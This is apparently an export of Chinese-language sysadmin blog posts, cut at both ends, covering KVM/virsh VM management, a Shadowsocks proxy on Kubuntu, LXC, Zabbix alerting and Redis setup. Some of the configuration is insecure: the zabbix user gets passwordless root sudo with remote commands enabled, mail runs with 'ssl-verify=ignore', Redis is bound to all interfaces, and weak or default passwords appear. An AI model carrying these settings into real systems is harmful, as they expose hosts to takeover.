1234567891011121314下面的示例将创建一个名为rhel6的虚拟机，其有两个虚拟CPU，安装方法为FTP，并指定了ks文件的位置，磁盘映像文件为稀疏格式，连接至物理主机上的名为brnet0的桥接网络：]# virt-install \ --connect qemu:///system \ --virt-type kvm \ --name rhel6 \ --ram 1024 \ --vcpus 2 \ --network bridge=brnet0 \ --disk path=/VMs/images/rhel6.img,size=120,sparse \ --location ftp://172.16.0.1/rhel6/dvd \ --extra_args “ks=http://172.16.0.1/rhel6.cfg” \ --os-variant rhel6 \ --force img安装 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162]# mv cirros-no_cloud-0.3.0-x86_64-disk.img c1.img[root@master ~]# qemu-img info c1.img image: c1.imgfile format: qcow2virtual size: 39M (41126400 bytes)disk size: 11Mcluster_size: 65536Format specific information: compat: 0.10]# virt-manager &amp;#采用import镜像文件方法，第四项进行图形安装。]# virsh list Id Name State---------------------------------------------------- 2 centos6.9 running]# virshWelcome to virsh, the virtualization interactive terminal.Type: &apos;help&apos; for help with commands &apos;quit&apos; to quitvirsh # console centos6.9Connected to domain centos6.9Escape character is ^]login as &apos;mageedu&apos; user. default password: &apos;mageedu.com&apos;. use &apos;sudo&apos; for root.cirros login: mageedu Password: $ sudo su -# ls#### ctrl+] 退出终端 ####virsh # help domain #虚拟机管理virsh # domstats centos6.9Domain: &apos;centos6.9&apos; state.state=1 state.reason=1 cpu.time=16312974545 cpu.user=1730000000····------管理虚拟机domain------]# virsh list ]# virsh start c2]# virsh destroy c2 ]# virsh reboot c2]# virsh undefine c2]# virsh save c2 /tmp/c2.sanp]# virsh restore /tmp/c2.sanp----hypervisor----]# virsh nodeinfo]# virsh capabilities----Interface----- #管理hypervisor的网络iface----Networking----#管理guest的网络----Storage Pool----#存储池管理 配置文件/etc/libvirt/qemu/centos6.9.xml,修改部分内容即可复制新虚拟机. 123456789]# cp /etc/libvirt/qemu/centos6.9.xml /etc/libvirt/qemu/c2.xml]# vim /etc/libvirt/qemu/c2.xml ###将centos6.9替换成c2，uuid,source的path等修改即可##准备qcow2及img文件]# qemu-img create -f qcow2 -o size=40G /images/vml/c2.qcow2]# mv cirros-no_cloud-0.3.0-x86_64-disk.img c2.img#创建虚拟机并进入终端。]# virsh create --console /etc/libvirt/qemu/c2.xml 批量创建虚拟机当然，如果批量创建虚拟机机，上面的操作依然繁琐，这里推荐一个脚本复制，时间会稍长。 123for i in &#123;1..30&#125;; do virt-clone --connect=qemu:///system -o temp -n node$i -f /data/node$i.imgdone 当然，也有批量删除的. 123for i in &#123;1..30&#125;; do do virsh undefine node$idone 这里，每个虚拟机都有相应的ip,桥接的网卡是172.20/16网段的。要求能获取每个虚拟机的Ip,这里推荐一个脚本获取，当然，需要相应主机是running状态的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950]# vim vish.sh#!/bin/bash #ping当前网段内在线的主机,以便产生arp记录. for ip in 172.20.128.&#123;1..253&#125;;do &#123; ping -c1 $ip &gt;/dev/null 2&gt;&amp;1 &#125;&amp; done#依次查找arp记录. running_vms=`virsh list |grep running` echo -ne &quot;共有`echo &quot;$running_vms&quot;|wc -l`个虚拟机在运行.\n&quot; for i in `echo &quot;$running_vms&quot; | awk &apos;&#123; print $2 &#125;&apos;`;do mac=`virsh dumpxml $i |grep &quot;mac address&quot;|sed &quot;s/.*&apos;\(.*\)&apos;.*/\1/g&quot;` ip=`arp -ne |grep &quot;$mac&quot; |awk &apos;&#123;printf $1&#125;&apos;` printf &quot;%-30s %-30s\n&quot; $i $ip done]# chmod +x virsh.sh]# ./virt.sh 共有31个虚拟机在运行.ubuntu16.04 172.20.128.166 node1 172.20.128.201 node2 172.20.128.202 node3 172.20.128.203 node4 172.20.128.204 node5 172.20.128.205 node6 172.20.128.206 node7 172.20.128.207 node8 172.20.128.208 node9 172.20.128.209 node10 172.20.128.210 node11 172.20.128.211 node12 172.20.128.212 node13 172.20.128.213 node14 172.20.128.215 node15 172.20.128.214 node16 172.20.128.217 node17 172.20.128.216 node18 172.20.128.218 node19 172.20.128.219 node20 172.20.128.220 node21 172.20.128.222 node22 172.20.128.221 node23 172.20.128.224 node24 172.20.128.229 node25 172.20.128.227 node26 172.20.128.225 node27 172.20.128.223 node28 172.20.128.226 node29 172.20.128.230 node30 172.20.128.228]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>virtul</tag>
        <tag>虚拟化技术</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kubuntu 从安装到科学上网]]></title>
    <url>%2Fkubuntu.html</url>
    <content type="text"><![CDATA[摘要： 科学上网 lxc容器 系统：Kubuntu 18.04 X86_64 科学上网 安装代理 安装shadowsocks,这里不要用系统自带的sudo apt install shadowsocks,下载的不是最新的，不支持加密选项，会报错，这里博主犯错了，习惯了用vim编辑，所以这里我推荐使用。 12345678910111213$ sudo apt-get install python-pip -y$ sudo apt-get install git -y$ pip install git+https://github.com/shadowsocks/shadowsocks.git@master$ sudo apt-get install vim -y#下载的shadowsocks是最新版，在/home/$user/.local/bin/&#123;ssserver,sslocal&#125;$ sudo echo &quot;export PATH=/home/feng/.local/bin:$PATH&quot; &gt; /etc/profile.d/ss.sh$ . /etc/profile.d/ss.sh$ echo $PATH/home/feng/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin#已经在环境变量里面，所以可以直接运行。 配置文件创建 1234567891011$ sudo vim /etc/shadowsocks.json&#123; &quot;server&quot;: &quot;serverip&quot;, &quot;server_port&quot;: port, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;: 1080, &quot;timeout&quot;:300, &quot;password&quot;: &quot;password&quot;, &quot;method&quot;: &quot;aes-256-cfb&quot;, &quot;fast_open&quot;:false&#125; 启动 12345678910$ sudo sslocal -c /etc/shadowsocks.json -d start #sslocal -h 查看帮助 -c CONFIG path to config file -s SERVER_ADDR server address -p SERVER_PORT server port, default: 8388 -b LOCAL_ADDR local binding address, default: 127.0.0.1 -l LOCAL_PORT local port, default: 1080 -k PASSWORD password -m METHOD encryption method, default: aes-256-cfb 默认开机启动ubuntu18.04默认是systemd管理启动 以前启动mysql服务: 1sudo service mysqld start 现在： 1sudo systemctl start mariadb.service systemd 默认读取 /etc/systemd/system 下的配置文件，该目录下的文件会链接/lib/systemd/system/下的文件。 执行 ls /lib/systemd/system 你可以看到有很多启动脚本，其中就有我们需要的 rc.local.service： 123456789101112131415161718192021222324$ cat /lib/systemd/system/rc.local.service # SPDX-License-Identifier: LGPL-2.1+## This file is part of systemd.## systemd is free software; you can redistribute it and/or modify it# under the terms of the GNU Lesser General Public License as published by# the Free Software Foundation; either version 2.1 of the License, or# (at your option) any later version.# This unit gets pulled automatically into multi-user.target by# systemd-rc-local-generator if /etc/rc.local is executable.[Unit]Description=/etc/rc.local CompatibilityDocumentation=man:systemd-rc-local-generator(8)ConditionFileIsExecutable=/etc/rc.localAfter=network.target[Service]Type=forkingExecStart=/etc/rc.local startTimeoutSec=0RemainAfterExit=yesGuessMainPID=no 正常启动文件 [Unit] 段: 启动顺序与依赖关系 [Service] 段: 启动行为,如何启动，启动类型 [Install] 段: 定义如何安装这个配置文件，即怎样做到开机启动 可以看出，/etc/rc.local 的启动顺序是在网络后面，但是显然它少了 Install 段，也就没有定义如何做到开机启动，所以显然这样配置是无效的。 因此我们就需要在后面帮他加上 [Install] 段: 123[Install] WantedBy=multi-user.target Alias=rc-local.service 这里需要注意一下，ubuntu-18.04 默认是没有 /etc/rc.local 这个文件的，需要自己创建 1$ sudo touch /etc/rc.local 然后把你需要启动脚本写入 /etc/rc.local ，我们不妨写一些测试的脚本放在里面，以便验证脚本是否生效. 创建开机启动的软链接,这点也比较关键，systemd 默认读取 /etc/systemd/system 下的配置文件, 所以还需要在 /etc/systemd/system 目录下创建软链接 1ln -s /lib/systemd/system/rc.local.service /etc/systemd/system/ 开机自动启动shadowsocks 123$ sudo vim /etc/rc.localhome/feng/.local/bin/sslocal -c /etc/shadowsocks.json -d start tips，如果上述操作不成功，可以尝试手工启动 123456]# vim ss.sh#!/bin/bash/usr/bin/sudo $HOME/.local/bin/sslocal -c /etc/shadowsocks.json -d start]# chmod +x ss.sh]# ./ss.sh输入秘密即可开启 fixfox代理设置 打开firefox浏览器，添加Proxy SwitchyOmega 1231.在浏览器里输入about:addons2.在 Search on addons.mozilla.org里输入 Proxy SwitchyOmega 3.点击Add添加后，有浏览器告诉你如何安装 设置Proxy 12345678910111213141516171819#点击已经添加的Proxy SwitchyOmega 1.#点击Profiles下的Proxy Scheme Protocol Server Port (default) SOCKS5 127.0.0.1 10802.#点击Profiles下的auto switch 添加 Rule list rules (Any request matching the rule list below) proxy Default Direct Rule List Config Rule List Format Switchy AutoProxy #选择AutoProxy Rule List URL https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt #设置完后，点击Download Profile Now 3.#点击ACTIONS ----Apply changes 至此设置完成 点击firefox，进行访问，在浏览器右上角点击小圆圈选择auto swith,然后访问google吧 123456$ tail /var/log/shadowsocks.log INFO: loading config from /etc/shadowsocks/config.json2018-07-25 21:15:49 INFO starting local at 127.0.0.1:10802018-07-25 22:18:31 INFO connecting www.google.com:443 from 127.0.0.1:495322018-07-25 22:18:31 INFO connecting www.google.com:443 from 127.0.0.1:495362018-07-25 22:18:31 INFO connecting www.google.com:443 from 127.0.0.1:49540 chrome代理设置 SwitchyOmega下载github上的chrome的.crx文件. 进入chrome浏览器，进入拓展管理页面，勾选开发模式，把下载好的crx文件拖入插件区域即可。 后续可以参照firefox即可。 如果拖拽不了.crx文件，请使用下面的命令进入chrome，即可安装 1# /opt/google/chrome/chrome --enable-easy-off-store-extension-install 感谢阅读！ 踏坑学习 安装shadowsocks 1sudo apt-get install shadowsocks 后面的操作基本上面进行，依然访问不了 12tail -f /var/log/shadowsocks.log 2018-07-25 22:18:31 INFO clinet connecting denied 这里权限拒绝，是支持的加密方式可能和我的VPS不一样 。安装最新的shadowscoks即可解决问题！ ubuntu-lxc容器创建12345678910111213141516sudo apt-get install lxc* #搭建lxc sudo apt-get install yum #搭建yumsudo lxc-create -n temp -t centos #创建centos系统主机名为temp。sudo chroot /var/lib/lxc/temp/rootfs passwd #输入root密码sudo lxc-copy -n temp -N node01 #fork新的虚拟机以temp为模板。sudo lxc-lssudo lxc-ls -f #查看容器信息sudo lxc-start -n node01 #开启 node01sudo lxc-console -n node01 #进入 node01sudo lxc-ls -f ssh root@10.0.3.116 #ssh连接sudo lxc-info -n node01sudo lxc-start tempsudo lxc-info -n tempsudo lxc-stop -n node01 #停止服务sudo lxc-destroy -n node01 #销毁容器]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>shadowsocks</tag>
        <tag>chrome</tag>
        <tag>SwitchyOmega</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Zabbix]]></title>
    <url>%2Fzabbix.html</url>
    <content type="text"><![CDATA[摘要： 监控系统满足的条件 Zabbix概述 Zabbix安装配置及相关术语 Zabbix实现QQ邮箱通知监控 监控系统满足的条件 采集 1234567agentless: SSH/TelnetSNMP: simple network manage protocal UDPIPMI: intelligent jmx(java management eXtensions):agent: sensor 存储 1234NVPS (New Values Per Second)Zabbix:MySQL,PGSQL...PHP...Cacti:rrd(round-robin database)...SNMP...NagiosPrometheus: NOSQL,Agent(exporter),Time Series /Streaming Databases.... PHP 可视化 1gafana #一个图形界面 告警 1Nagios,bash shell Zabbix组件概述12345Zabbix serverDatabase StorageWeb interfaceProxyAgent zabbix介绍 zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。 zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。 zabbix由2部分构成，zabbix server与可选组件zabbix agent。 zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux, Solaris, HP-UX, AIX, Free BSD, Open BSD, OS X等平台上。 zabbix agent需要安装在被监视的目标服务器上，它主要完成对硬件信息或与操作系统有关的内存，CPU等信息的收集。zabbix agent可以运行在Linux,Solaris,HP-UX,AIX,Free BSD,Open BSD, OS X, Tru64/OSF1, Windows NT4.0, Windows (2000/2003/XP/Vista)等系统之上。 zabbix server可以单独监视远程服务器的服务状态；同时也可以与zabbix agent配合，可以轮询zabbix agent主动接收监视数据（agent方式），同时还可被动接收zabbix agent发送的数据（trapping方式）。 另外zabbix server还支持SNMP (v1,v2)，可以与SNMP软件(例如：net-snmp)等配合使用。 zabbix程序的组件： 12345678zabbix_server：服务端守护进程；zabbix_agentd：agent守护进程；zabbix_proxy：代理服务器，可选组件；zabbix_get：命令行工具，手动测试向agent发起数据采集请求；zabbix_sender：命令行工具，运行于agent端，手动向server端发送数据；zabbix_java_gateway: java网关；zabbix_database：MySQL或PostgreSQL；zabbix_web：Web GUI zabbix逻辑组件： 123456789101112131415主机组(host group)主机 (hosts)监控项(item) key：实现获取监控的目标上的数据的命令或脚本的名称；应用(application)：同一类监控项的集合；触发器(trigger)：表达式；PROBLEM， OK；事件(event)：动作(action)：由条件(condition)和操作(operation)组件；媒介(media)：发送通知的通道；通知(notification)：远程命令(remote command)：报警升级()：模板(template)：快速定义被监控主机的各监控项的预设项目集合；图形(graph)：用于展示历史数据或趋势数据的图像；屏幕(screen)：由多个graph组成； Zabbix安装Zabbix镜像选择仓库准备，这里选择国内的阿里云镜像（也可以选择清华源），这里使用zabbix3.4 123456789101112]# vim /etc/yum.repos.d/zabbix.repo[zabbix]name=zabbixbaseurl=https://mirrors.aliyun.com/zabbix/zabbix/3.4/rhel/7/x86_64/gpgcheck=0[zabbix-non]name=zabbixnonbaseurl=https://mirrors.aliyun.com/zabbix/non-supported/rhel/7/x86_64/ gpgcheck=0##复制到从节点一份]# scp /etc/yum.repos.d/zabbix.repo node01:/etc/yum.repos.d/ 安装并配置Zabbix_Server 开始安装Zabbix server, frontend, agent, get;搭建lamp环境，如果不会可以看前面的博客lamp搭建 12# yum install zabbix-server-mysql zabbix-web-mysql zabbix-agent zabbix-get -y# yum install -y httpd mariadb-server php php-mysql 创建数据库，授权zabbix用户并导入数据。 12345]# systemctl start mariadb httpd]# mysql -uroot -ppasswordmysql&gt; create database zabbix character set utf8 collate utf8_bin;mysql&gt; grant all privileges on zabbix.* to zabbix@&apos;192.168.1.%&apos; identified by &apos;centos&apos;;]# zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uzabbix -pcentos zabbix -h192.168.1.18 编辑zabbix_server.conf,修改数据库的密码项及主机，其他不变动 1234567891011121314]# vim /etc/zabbix/zabbix_server.confLogFile=/var/log/zabbix/zabbix_server.logLogFileSize=0PidFile=/var/run/zabbix/zabbix_server.pidSocketDir=/var/run/zabbixDBHost=192.168.1.18DBName=zabbixDBUser=zabbixDBPassword=centosSNMPTrapperFile=/var/log/snmptrap/snmptrap.logTimeout=4AlertScriptsPath=/usr/lib/zabbix/alertscriptsExternalScripts=/usr/lib/zabbix/externalscriptsLogSlowQueries=3000 修改httpd下的zabbix.conf文件的时区 12]# vim /etc/httpd/conf.d/zabbix.confphp_value date.timezone Asia/Shanghai #修改为上海时区。 启动服务 12]# systemctl restart zabbix-server zabbix-agent httpd]# systemctl enable zabbix-server zabbix-agent http 访问http://host/zabbix，进行傻瓜式安装，安装生成的配置文件：/etc/zabbix/web/zabbix.conf.php 安装配置好后进入登录界面，默认用户名Admin，密码zabbix。 配置Agent端 node01 123]# yum install -y zabbix-agentUnit file： zabbix-agent.service 配置说明 12345678910111213141516171819202122配置文件：/etc/zabbix/zabbix_agentd.conf ############ GENERAL PARAMETERS ################# ##### Passive checks related 被动监控相关配置 ##### Active checks related 主动监控相关配置，agent端主动向server周期性发送数据； ############ ADVANCED PARAMETERS ################# ####### USER-DEFINED MONITORED PARAMETERS ####### 用户自定义参数 ####### LOADABLE MODULES ####### ####### TLS-RELATED PARAMETERS ####### ##### Passive checks related Server=IP1, IP2, ... ListenPort=10050 ListenIP=0.0.0.0 StartAgents=3 ##### Active checks related ServerActive=IP1[:port], IP2[:port], ... Hostname=Unique_HOSTNAME 必须与服务器配置的监控主机的主机名称保持一致； zabbix术语 zabbix入门 1234567891011121314151617监控系统： 采集 --&gt; 存储(MySQL/PGSQL/Sqlite) --&gt; 报警 --&gt; 可视化 zabbix： 采集： agent/snmp/IPMI/jmx 设备：主机(hosts) --&gt; 主机组(hostgroups) 监控项(items) --&gt; 应用组(applications) 触发器(triggers, 表达式) --&gt; trigger events 动作(actions, CONDITIONS, OPERATIONS, RECOVERY OPERATIONS) OPERATIONS： remote command send message --&gt; USERS (media) Media Type：Email/ 可视化： graph, slide show, map grafana: 配置流程说明 1234术语：host groups --&gt; host --&gt; application --&gt; item --&gt; trigger --&gt; action (conditions, operations) graph: simple: 每个item定义完成后自动生成 customed：用于将多个item的数据整合于一个图形中展示 items 12345678910111213141516171819202122items: key+parameter key: zabbix内建： type: agent (server:pull) agent(active) (agent:push) snmp v1 ... 用户自定义(UserParameter) 采集到的数据的类型： 数值： 整数 浮点数 字符串： 字符串 文本 存储的值： As is：不对数据做任何处理 Delta：（simple change)，本次采样减去前一次采样的值的结果 Delta：（speed per second)，本次采样减去前一次采样的值，再除以经过的时长； trigger 12345678910111213141516171819202122232425262728293031323334353637383940trigger： 界定某特定的item采集到的数据的非合理区间或非合理状态：逻辑表达式 逻辑表达式，阈值；通常用于定义数据的不合理区间； OK：正常 状态 --&gt; 较老的zabbix版本，其为FALSE； PROBLEM：非正常 状态 --&gt; 较老的zabbix版本，其为TRUE； OK --&gt; PROBLEM Recovery：PROBLEM --&gt; OK 触发器存在可调用的函数： nodata() last() date() time() now() dayofmonth() ... Severity：严重等级 Not classified Information Warning Average High Disaster 触发器表达式： &#123;hostname:key[paramters].function(arguments) &gt;, &lt;, =, #（not equal）... +, -, *, / &amp;, | &#123;n1.magedu.com:net.if.in[eno16777736,packets].last(#1)&#125;&gt;15 trigger间存在依赖关系： zabbix server &lt;--&gt; Router1 &lt;--&gt; Host1 事件机制： 四种事件源：trigger, discovery, auto registration, internal Media 1234567891011Media：媒介 告警信息的传递通道； 类型： Email：邮件 Script：自定义脚本 SMS：短信 Jabber： Ez Texting： 接收信息的目标为zabbix用户： 需要用户上定义对应各种媒介通道的接收方式； Action 12345678910111213141516171819202122232425conditions： 多个条件之间存在逻辑关系；operations： 条件满足时触发的操作； send message： (1) Media type：传递信息的通道； (a) Email (b) Script：报警脚本； 脚本放置路径：zabbix_server.conf配置文件中AlertScriptsPath参数定义的路径下； /usr/lib/zabbix/alertscripts/ zabbix服务器在调用脚本时，会向其传递三个参数： $1：经由此信道接收信息的目标； $2：subject $3：body zabbix 3.0之后的版本，此三个变量定义为内部宏： &#123;ALERT.SENDTO&#125; &#123;ALERT.SUBJECT&#125; &#123;ALERT.MESSAGE&#125; (2) 信息接收人： (a) User Groups (b) Users admin: Python报警脚本示例： 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/python#coding:utf-8import smtplibfrom email.mime.text import MIMETextfrom email.header import Headerfrom email.utils import parseaddr, formataddrimport sysdef formatAddr(s): name, addr = parseaddr(s) return formataddr((Header(name, &apos;utf-8&apos;).encode(), addr))def send_mail(to_list,subject,content): mail_host = &apos;smtp.exmail.qq.com&apos; mail_user = &apos;USERNAME@DOMAIN.TLD&apos; mail_pass = &apos;YOUR_PASSWORD&apos; #以上内容根据你的实际情况进行修改,pass为stmp的授权码。 msg = MIMEText(content,&apos;&apos;,&apos;utf-8&apos;) msg[&apos;Subject&apos;] = Header(subject, &apos;utf-8&apos;).encode() msg[&apos;From&apos;] = formatAddr(&apos;zabbix监控 &lt;%s&gt;&apos; % mail_user).encode() msg[&apos;to&apos;] = to_list try: s = smtplib.SMTP() s.connect(mail_host) s.login(mail_user,mail_pass) s.sendmail(mail_user,to_list,msg.as_string()) s.close() return True except Exception,e: print str(e) return Falseif __name__ == &quot;__main__&quot;: send_mail(sys.argv[1], sys.argv[2], sys.argv[3]) remote command 123456789101112131415161718192021222324252627功能： 在agent所在的主机上运行用户指定的命令或脚本；例如： 重启服务； 通过IPMI重启服务器； 任何用户自定义脚本中定义的操作； 可执行的命令类型： IPMI ssh telnet Custom Script Global Script 前提：在agent需要完成的配置： (1) zabbix用户拥有所需要的管理权限； 编辑/etc/sudoers文件，注释如下行； ]# visudo # Defaults requiretty 添加如下行： zabbix ALL=(ALL) NOPASSWD: ALL (2) agent进程要允许执行远程命令； ]# vim /etc/zabbix/zabbix_agentd.conf，设置如下配置： EnableRemoteCommands=1 重启服务生效； 总结： 12345678host groups --&gt; host --&gt; application --&gt; item (key) --&gt; trigger --&gt; action (1) media type (2) user group/useraction operations: 可定义为升级方式； send message remote command Zabbix告警消息通过qq邮件发送 情形 12345zabbix_server (Zabbix) 3.4.11zabbix_agentd (daemon) (Zabbix) 3.4.11--------------------------Zabbix_server 192.168.1.18Zabbix_agent 192.168.1.28 Zabbix-server配置 安装相关的邮件服务，当然qq号不会是自己的啦 123456789]# yum install -y mailx dos2unix]# vim /etc/mail.rcset from=932165012@qq.comset smtp=smtp.qq.comset smtp-auth-user=932165012@qq.comset smtp-auth-password=************ #此次password是授权码，而不是登录密码，自行谷歌解决。set smtp-auth=loginset ssl-verify=ignoreset nss-config-dir=/etc/pki/nssdb 测试邮件服务是否可用，收到邮件即可认为成功 1]# echo &quot;zabbix test mail&quot; |mail -s &quot;zabbix&quot; 932165012@qq.com 编写bash脚本，/usr/lib/zabbix/alertscripts/mail.sh,Zabbix的配置文件定义此文件为脚本文件目录。 1234567891011121314]# vim /usr/lib/zabbix/alertscripts/mail.sh#!/bin/bashto=$1subject=$2body=$3#三个参数对应是收件人，主题，邮件主体内容date &quot;+%F %T&quot; &gt;&gt; /usr/lib/zabbix/alertscripts/sendmail.logecho &quot;$to&quot; &quot;$subject&quot; &quot;$body&quot; &gt;&gt; /usr/lib/zabbix/alertscripts/sendmail.log#记录发件日志echo &quot;$body&quot; | dos2unix -k | mail -s &quot;$subject&quot; &quot;$to&quot;#发邮件的命令，dos2unix转码发送。防止乱码]# chmod +x /usr/lib/zabbix/alertscripts/mail.sh web界面进行配置主机相关配置 hosts配置 12345678910Host name node01.fenghong.techVisible name node01Groups My Servers Agent interfaces IP address DNS name Connect to Port Default 192.168.1.28 10050#Groups随便从列表里选一个，我选的是my servers。#主要是主机名，别名和Agent的IP配置，当然如果有DNS解析，填写主机名也是没有问题的#点击Add添加即可 applications 12Configuration-----&gt; node01 -----&gt; Applications ------&gt; Create Application name nginx status items 12345678Configuration-----&gt; node01 -----&gt; items -----&gt; Create item Name Nginx service state Type Zabbix agent #系统默认 Key net.tcp.port[192.168.1.28,80] Host interface 192.168.1.28:10050 #系统默认 Type of information Numeric(unsigned) #系统默认 Update interval 5s Applications nginx status #刚创建的 trigger配置 12345678Configuration-----&gt; node01 -----&gt; triggers -----&gt; create trigger Name nginx down Severity High Exprssion -----&gt; add Last of(T) 3 Count #下拉选择Count insert #配置完成Add 报警动作配置 Meida types配置 12345678910Administration-----&gt; Media types ------&gt; create media typeName QqMailAlarm #名字随便写Type Script #选择ScriptScript name mail.sh #填写为上面编写的脚本文件Script parameters Parameter Action &#123;ALERT.SENDTO&#125; &#123;ALERT.SUBJECT&#125; &#123;ALERT.MESSAGE&#125;#这三个宏变量顺序不能错，然后点击Add即可 用户配置 1234567891011121314Administration-----&gt; Users -----&gt; Admin -----&gt; Media -----&gt; AddType QqMailAlarm #Media Type 的名称，下拉选项Send to 932165012@qq.com #填写发送至相应的qq邮箱When active 1-7,00:00-24:00 #发送的时间Use if severity #级别，建议根据人员的级别而发送不同的通知，默认全部勾选 Not classified Information Warning Average High Disaster Enabled# 配置好后，点击添加Add完成用户的配置。 配置action,默认已经配置好trigger和hosts。比如 123456789101112131415161718192021222324252627Configuration -----&gt; Actions -----&gt; create action -----&gt; ActionName nginx sevice #选择一个名字，这里用nginx服务来检测Conditions Label Name Action A Trigger = node01: nginx down Remove#node01 为配置好的hosts#nginx down 为配置好的trigger#选择Trigger，点击select即可选择配置好的triggerNew condition AddEnabled-----&gt; OperationsDefault operation step duration 60s #选择60s为了方便检测是否发送了邮件Default subject Problem: &#123;TRIGGER.NAME&#125; #默认即可Default message Problem started at &#123;EVENT.TIME&#125; on &#123;EVENT.DATE&#125; Problem name: &#123;TRIGGER.NAME&#125; Host: &#123;HOST.NAME&#125; Severity: &#123;TRIGGER.SEVERITY&#125; Original problem ID: &#123;EVENT.ID&#125; &#123;TRIGGER.URL&#125;----&gt; 点击Operation New，来进行配置动作。 Send to Users 然后Add选择Admin Send only to 下拉选择QqMailAlarm #然后点击最下面的Add，添加Action#至此，基本结束。 验证告警信息是否成功自动发送邮件,停止node01上的nginx服务,能立马收到邮件。 1]# systemctl stop nginx 当然，Zabbix也支持远程的脚本命令来进行某些操作，比如重启nginx服务，这里面又涉及Remote command，这里不赘述了。]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>Linux</tag>
        <tag>internet</tag>
        <tag>watch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis]]></title>
    <url>%2Fredis.html</url>
    <content type="text"><![CDATA[摘要： 分布式系统存储特点 Redis概述及安装 Redis集群及HA高可用实现 分布式存储特点CAP：一个分布式系统不可能同时满足C、A、P三个特性，最多可同时满足其中两者；对于分布式统满足分区容错性几乎是必须的 C：多个数据节点上的数据一致； A：用户发出请求后的有限时间范围内返回结果； P：network partition，网络发生分区后，服务是否依然可用；BASE：BA，S，E，基于CAP演化而来 BA：Basically Available，基本可用； S：Soft state，软状态/柔性事务，即状态可以在一个时间窗口内是不同步的； E：Eventually consistency，最终一致性；分布式一致性协议：Paxos，Raft等 Redis概述 随着业务的增长和产品的完善，急速增长的数据给Oracle数据库带来了很大的压力，而随着我们对产品服务质量要求的提高，传统的数据查询方式已无法满足我们需求。为此我们需要寻找另外一种模式来提高数据查询效率。NoSQL内存数据库是最近兴起的新型数据库，Nosql官网，它的特点就是把数据放在内存中操作，数据处理速度相对于磁盘提高了好几个量级，因此，通过把经常访问的数据转移到内存数据库中，不但可以缓解Oracle的访问压力，而且可以极大提高数据的访问速度，提高用户体验。 Redis是一个开源的，先进的key-value持久化产品。它通常被称为数据结构服务器，REmote DIctionary Server，它的值可以是字符串（String）、哈希（Map）、列表（List）、集合（Sets）和有序集合（Sorted sets）等类型。可以在这些类型上面做一些原子操作，如：字符串追加、增加Hash里面的值、添加元素到列表、计算集合的交集，并集和差集；或者区有序集合中排名最高的成员。为了取得好的性能，Redis是一个内存型数据库。不限于此，Redis也可以把数据持久化到磁盘中，或者把数据操作指令追加了一个日志文件，把它用于持久化。也可以用Redis容易的搭建master-slave架构用于数据复制。其它让它像缓存的特性包括，简单的check-and-set机制，pub/sub和配置设置。Redis可以用大部分程序语言来操作：C、C++、C#、Java、Node.js、php、ruby等等。Redis是用ANSIC写的，可以运行在多数POSIX系统，如：Linux，*BSD，OS X和Soloris等。官方版本不支持Windows下构建，可以选择一些修改过的版本，照样可以使用Redis。 Redis简介 安装及配置 centos系统的base仓库自带redis-3.2.10，我们用yum安装即可. 1234567891011121314151617181920212223~]# yum info redis~]# yum install -y redis~]# rpm -q --scripts redis ~]# rpm -ql redis~]# vim /etc/redis.conf #仅修改以下选项bind 0.0.0.0 #增加监听地址为所有requirepass ilinux #要求密码验证~]# systemctl start redis~]# grep &apos;^####&apos; /etc/redis.conf #配置文件的段落如下################################## INCLUDES ##################################################################### NETWORK ###################################################################### GENERAL ##################################################################### SNAPSHOTTING ################################################################# REPLICATION ################################################################### SECURITY ###################################################################### LIMITS ################################################################## APPEND ONLY MODE ############################################################### LUA SCRIPTING ############################################################### REDIS CLUSTER ################################################################# SLOW LOG ################################################################### LATENCY MONITOR ########################################################### EVENT NOTIFICATION ############################################################# ADVANCED CONFIG ############################### Redis的基本数据结构（5种） 123451.STRING：可以存储字符串、浮点型、整型，如果是字符串可以执行字符串操作，如果是浮点型、整型也可以执行加减操作。redis会识别出它的具体类型。2.LIST：链表，链表中的每个NODE包含一个字符串。可以对链表进行两端推入、弹出操作。3.SET：无序集合，不会存在相同的集合元素，集合的交集、并集、差集运算。4.HASH：键值对的无需散列，增、删、获取键值。5.ZSET：有序集合，根据一个浮点数分值来排序。 redis两种持久化原理（RDB、AOF） 1234567891011redis支持两种方式来持久化数据 第一种：snapshotting(镜像或快照）也称RDB; 第二种：AOF(append-only file 文件追加)。如： RDB：镜像模式就是将某个时间段的所有内存数据直接写入硬盘。 AOF：将执行的写命令增量复制到硬盘里面。这两种其实就是不同的侧重，RDB是数据持久化，AOF是命令持久化，数据持久化比较直接，还原的时候直接恢复数据即可。命令持久化恢复的话需要执行一遍命令才行。redis执行持久化操作取决于两方面：默认是根据持久化配置来执行，还有就是用户手动触发。手动触发有两个命令 SAVE:会block所有的用户操作，知道持久化结束。 BGSAVE:后台子进程执行，linux中使用fork命令开启一个子进程副本，这个子进程副本与主进程共用一套内存空间，直到主进程或子进程对内存进行修改，被修改之后的内存区域将被子进程复制出来单独使用。 持久化存储对应的配置文件设置 12345678910111213141516171819]# vim /etc/redis.conf################################ SNAPSHOTTING ################################save 900 1save 300 10save 60 10000save 5 200000stop-writes-on-bgsave-error yesrdbcompression yesrdbchecksum yesdbfilename dump.rdbdir /var/lib/redis############################## APPEND ONLY MODE ###############################appendonly noappendfilename &quot;appendonly.aof&quot;appendfsync everysecno-appendfsync-on-rewrite noauto-aof-rewrite-percentage 